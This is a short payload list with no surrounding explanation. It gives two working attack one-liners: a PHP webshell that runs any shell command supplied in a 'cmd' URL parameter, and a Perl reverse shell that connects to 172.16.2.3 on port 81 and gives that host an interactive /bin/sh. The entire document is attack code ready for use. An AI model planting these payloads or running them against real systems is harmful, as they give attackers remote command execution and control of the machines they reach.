1. PHP webshell

` <?php echo shell_exec($_GET['cmd'].' 2>&1'); ?> `



2. Perl reverse shell

` perl -e 'use Socket;$i="172.16.2.3";$p=81;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' `
